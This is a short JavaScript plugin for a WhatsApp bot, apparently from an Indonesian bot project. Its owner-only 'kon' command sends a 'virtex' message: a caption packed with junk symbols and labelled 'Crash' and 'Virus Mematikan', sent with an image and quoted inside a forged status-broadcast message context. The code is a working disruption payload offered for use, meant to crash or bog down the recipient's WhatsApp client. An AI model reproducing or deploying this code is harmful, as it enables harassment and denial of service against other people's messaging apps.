let handler = async (m, {conn}) => {
const fbug = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Ram Raja iblis`
}}
}
let ngawi = `*〽️VIRTEX NGAWI〽️*
_%%_¥¥}€{€~&^...^...€\_]_]£\ππ\¥[%[%~¥¥\π\€〽%〽€_😠¥\™~€_[_]€€\€~€]_[_¥[€\π\π¥]¥]Woi ireng😠🫵🏾\🎭〽£\€~€_]¥]™~¥£[%[%[£]¥\π€~_
💥Crash🌹
*999999*¥€&€©&®&©©€©€&®_•_~&~&~_{_]&]_]__]&~&~&\&>~&~~_^¥~¥\€]π]_]€€]_]_{...{€~__\€]€]...]_\_\€\...*9292828282882*πβπ...|€\€\€&|&]>]&]__]_]¥]¥¥]_\¥\€\π]¥

Virus Mematikan 😈/`
conn.sendMessage(m.chat, { image: { url: "https://telegra.ph/file/e7aab7738ecc6cc08f991.jpg" }, caption: ngawi }, {quoted: fbug})
}

handler.command = /^(kon)$/i
handler.owner = true

export default handler